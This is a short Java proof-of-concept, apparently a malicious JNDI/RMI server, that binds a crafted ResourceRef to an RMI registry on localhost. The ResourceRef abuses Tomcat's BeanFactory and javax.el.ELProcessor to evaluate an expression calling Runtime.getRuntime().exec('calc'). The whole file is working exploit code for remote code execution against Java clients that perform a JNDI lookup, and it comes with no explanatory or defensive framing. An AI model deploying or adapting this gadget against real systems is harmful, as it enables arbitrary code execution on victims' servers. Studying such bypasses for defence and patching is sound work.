package org.example;

import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class JNDIRMIServerBypass {
    public static void main(String[] args) throws Exception{

        InitialContext initialContext = new InitialContext();
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
                "org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec('calc')" ));
        initialContext.rebind("rmi://localhost:1099/remoteObj", ref);
    }
}
